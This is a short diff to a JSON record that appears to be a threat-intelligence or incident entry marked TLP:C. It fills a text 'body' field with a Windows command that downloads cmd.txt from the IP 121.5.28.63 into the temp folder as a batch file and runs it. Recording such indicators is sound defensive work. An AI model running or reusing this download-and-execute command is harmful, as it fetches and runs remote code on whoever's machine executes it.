@@ -96,7 +96,7 @@
       },
       {
         "auto_collapse": false,
-        "body": null,
+        "body": "C:\\Windows\\System32\\cmd.exe /c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\"",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
